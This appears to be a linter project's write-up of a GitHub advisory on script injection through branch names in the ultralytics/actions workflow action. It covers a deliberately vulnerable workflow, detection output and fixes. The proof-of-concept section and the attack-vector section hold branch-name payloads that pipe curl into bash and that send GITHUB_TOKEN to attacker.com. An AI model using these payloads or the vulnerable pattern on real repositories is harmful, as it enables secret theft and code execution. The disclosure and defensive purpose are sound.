# GHSA-7x29-qqmq-v6qc

## Summary

| Field | Value |
|-------|-------|
| CVE | Not assigned |
| Affected Action | ultralytics/actions |
| Severity | High (CVSS 7.8) |
| Vulnerability Type | Script Injection (CWE-94) |
| Published | 2025-01-29 |

## Vulnerability Description

The ultralytics/actions GitHub Action (versions <= 0.0.2) is vulnerable to script injection through the `github.head_ref` and `github.event.pull_request.head.ref` context variables when used with `pull_request_target` workflows. This is particularly severe because it executes in a privileged context with write permissions and access to secrets.

**Technical Details:**
- CVSS Score: 7.8/10 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:H/SA:N)
- CWE-94: Improper Control of Generation of Code (Code Injection)
- The vulnerability exists in the composite action's `action.yml` where GitHub context expressions are used directly in `run` steps

**Proof of Concept:**
1. Fork a repository using ultralytics/actions in a `pull_request_target` workflow
2. Create a branch with injection payload: `Hacked";{curl,-sSfL,<malicious-url>}${IFS}|${IFS}bash`
3. Create a draft pull request
4. If the action is reachable, achieve arbitrary code execution

**Attack Impact:**
- Execute arbitrary code in the base branch context
- Abuse `GITHUB_TOKEN` permissions for unauthorized actions
- Steal workflow secrets
- Compromise repository integrity

**The Fix (v0.0.3):**
The security patch moves GitHub context variables to environment variables:
- Before: `echo "github.head_ref: ${{ github.head_ref }}"`
- After: Uses `env: HEAD_REF: ${{ github.head_ref }}` then `echo "github.head_ref: $HEAD_REF"`

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-pr:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write

    steps:
      - name: Process branch name
        run: |
          # Direct interpolation in echo command - vulnerable!
          echo "Processing branch: ${{ github.head_ref }}"
          echo "${{ github.head_ref }}" > branch.txt

      - name: Create summary
        run: |
          # Also vulnerable in GITHUB_STEP_SUMMARY
          echo "## PR from branch ${{ github.head_ref }}" >> $GITHUB_STEP_SUMMARY
```

**Attack Vector**: An attacker can create a branch with name:
- `test$(curl http://attacker.com/?token=$GITHUB_TOKEN)`
- `feature$(printenv >> $GITHUB_STEP_SUMMARY)`
- These commands execute with write permissions and secret access

## sisakulint Detection Result

```
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:26:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 12). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:31:39: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:32:20: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:38:38: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:45:42: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml:45:42: argument injection (critical): "github.head_ref" is potentially untrusted and used as command-line argument to 'gh' in a workflow with privileged triggers. Attackers can inject malicious options (e.g., --output=/etc/passwd). Use '--' to end option parsing or pass through environment variables. See https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [argument-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | CodeInjectionCriticalRule | Yes - Perfect match |
| Yes | ArgumentInjectionCriticalRule | Yes |
| Yes | UntrustedCheckoutRule | Yes |

**Detection Details:**
- `CodeInjectionCriticalRule` **detects all 4 instances** of vulnerable `github.head_ref` usage (lines 31, 32, 38, 45)
- `ArgumentInjectionCriticalRule` detects command-line argument injection in `gh` command (line 45)
- `UntrustedCheckoutRule` detects unsafe checkout in privileged context (line 26)
- Provides correct remediation: "pass it through an environment variable"
- Auto-fix available: Moves expressions to environment variables and adds `--` marker for argument injection

## Mitigation

1. **Use environment variables**: This is the primary mitigation
   ```yaml
   env:
     BRANCH_NAME: ${{ github.head_ref }}
   run: |
     echo "Processing branch: $BRANCH_NAME"
     echo "$BRANCH_NAME" > branch.txt
   ```

2. **Reduce permissions**: Use minimal required permissions
   ```yaml
   permissions:
     contents: read
     pull-requests: read
   ```

3. **Avoid pull_request_target**: Use pull_request trigger when possible
   ```yaml
   on:
     pull_request:
       types: [opened, synchronize]
   ```

4. **Add input validation**: Validate branch name format
   ```yaml
   env:
     BRANCH_NAME: ${{ github.head_ref }}
   run: |
     if [[ "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_-]+$ ]]; then
       echo "Valid branch name"
     else
       echo "Invalid branch name"
       exit 1
     fi
   ```

## References

- [GitHub Advisory](https://github.com/advisories/GHSA-7x29-qqmq-v6qc)
- [Repository Security Advisory](https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc)
- [Security Patch Commit](https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a)
- [ultralytics/actions Repository](https://github.com/ultralytics/actions)
- [sisakulint: Code Injection Critical Rule](../codeinjection.md)
- [Sample Vulnerable Workflow](../../script/actions/advisory/GHSA-7x29-qqmq-v6qc-vulnerable.yaml)
- [Sample Safe Workflow](../../script/actions/advisory/GHSA-7x29-qqmq-v6qc-safe.yaml)
